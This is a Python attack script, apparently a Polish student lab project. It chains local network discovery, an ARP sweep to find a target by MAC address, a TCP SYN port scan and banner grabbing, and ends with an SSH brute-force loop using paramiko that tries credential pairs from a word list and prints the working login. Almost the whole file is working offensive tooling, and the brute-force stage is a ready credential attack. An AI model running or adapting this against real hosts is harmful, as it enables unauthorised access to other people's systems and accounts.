######################## 1 - GET LOCAL IP ADDRESS ################################
print("1", "\n")
import socket

def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('10.255.255.255', 1))
        IP = s.getsockname()[0]
    except:
        IP = '127.0.0.1'
    finally:
        s.close()
    return IP

local_ip = get_local_ip()
print("My local IP: ", local_ip)

##################################### 2 - GET MASK ADDRESS #####################################
print("2", "\n")
from pyroute2 import IPRoute

ip = IPRoute()
info = [{'iface': x['index'], 'addr': x.get_attr('IFA_ADDRESS'), 'mask':  x['prefixlen']} for x in ip.get_addr()]
a = info[1]

for k, v in a.items():
    if k == 'mask':
        break
masks = {0:'0.0.0.0', 1:'128.0.0.0', 2:'192.0.0.0', 3:'224.0.0.0', 4:'240.0.0.0', 5:'248.0.0.0', 6:'252.0.0.0', 7:'254.0.0.0', 8:'255.0.0.0', 9:'255.128.0.0', 10:'255.192.0.0', 11:'255.224.0.0', 12:'255.240.0.0', 13:'255.248.0.0', 14:'255.252.0.0', 15:'255.254.0.0', 16:'255.255.0.0', 17:'255.255.128.0', 18:'255.255.192.0', 19:'255.255.224.0', 20:'255.255.240.0', 21:'255.255.248.0', 22:'255.255.252.0', 23:'255.255.254.0', 24:'255.255.255.0', 25:'255.255.255.128', 26:'255.255.255.192', 27:'255.255.255.224', 28:'255.255.255.240', 29:'255.255.255.248', 30:'255.255.255.252', 31:'255.255.255.254', 32:'255.255.255.255'}

for index, mask in masks.items():

    if index == v:
        index == mask
        print("My local netmask: ", mask)
        break

####################################### 3 - Looking for target IP ########################################
print("3", "\n")

from scapy.all import *
from scapy.layers.inet import IP, TCP, Ether
from scapy.layers.l2 import ARP

for i in range(100, 105):
    ip = "192.168.0.{}".format(i)
    pakiet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip, hwdst="ff:ff:ff:ff:ff:ff")
    dane = srp1(pakiet, timeout=1, verbose=0)
    target_MAC = '08:00:27:89:f6:2e'

    if dane:
        # print("adres IP: {}, adres MAC: {}".format(str(dane.psrc), str(dane.hwsrc)))
        if target_MAC == dane.hwsrc:
            print("Target IP: ", str(dane.psrc))
            target_IP = dane.psrc

################################## 4 - Ports scaning #####################################
print("4", "\n")
cel = target_IP
pakiet = IP(dst="google.com")/ICMP()/"Projekt"
for port in range(1, 85): # poprawic wyswietlanie tylko istniejacych portow

    pakiet = IP(dst=cel)/TCP(dport=[port], flags = "S")
    rec, wrong = sr(pakiet, timeout=1, verbose=0) #timeout - dlugosc zycia, verbose - ilosc wyswietlanych inf zwrotnych 0 - 3

    if rec:
        usluga = "{}".format(str(str(rec[0]).split(" ")[7][6:]))
        dane = f"Port: {port} otwarty, usluga = {usluga}"
        if str(port) != usluga:
        # print(usluga != str(port))
            print(dane)
    else:
        continue


################################## 5 - Banner Grabbing #####################################
print("5", "\n")
import socket
import sys

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Dopracowac wyswietlanie apache

target = target_IP

# for port in range(20, 85):
#     try:
#         connection = s.connect((target, port))
#         print(f"[+] {target}: port {port} is OPEN")
#         s.send("Get banner \r\n".encode())
#         response = s.recv((2048)).decode()
#         print("Name and version service: ", response)
#     except:
# #        print(f"[-] {target}: port {port} is CLOSED")
#         pass
to_scan = input("Enter host IP to scan: ")
to_scan_IP = socket.gethostbyname(to_scan)

print("-" * 60)
print("Please wait, scanning remote host", to_scan_IP)
print("-" * 60)

# ports limited to 100, for testing need the script to work faster
try:
    for port in range(1, 100):
        package = IP(dst=to_scan) / TCP(dport=[port], flags="S")
        rec, wrong = sr(package, timeout=1, verbose=0)
        service = f"{str(rec[0]).split(' ')[7][6:]}"
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        result = sock.connect_ex((to_scan_IP, port))
        if result == 0:
            print("Port {}: Open".format(port), service)
        sock.close()
except KeyboardInterrupt:
    print("You pressed Ctrl+C")
    sys.exit()

except socket.gaierror:
    print('Hostname could not be resolved. Exiting')
    sys.exit()

except socket.error:
    print("Couldn't connect to server")
    sys.exit()
############################################ 6 - Brute Force ########################################
print("6", "\n")
import paramiko

with open('correctpasses.txt') as f:
    users = f.read().splitlines()

target = target_IP
ssh_server = paramiko.SSHClient()
ssh_server.set_missing_host_key_policy(paramiko.AutoAddPolicy)
ssh_server.load_system_host_keys()
port = 22
print("program in progress")

for user in users:
    for password in users:
        try:
            #print(f"[*] Trying> {user}:{password}", end="")
            ssh_server.connect(target, port, user, password)
            print(f" - SUCCESS")
            print(f"Correct login and password for SSH: > {user}:{password}")
            ssh_server.close()
            if ssh_server.connect(target, port, user, password, timeout=20) == None:
                print("stop")
                sys.exit()
        except Exception as exc:
            # print("[-] Brute-force attack failed!")
            pass
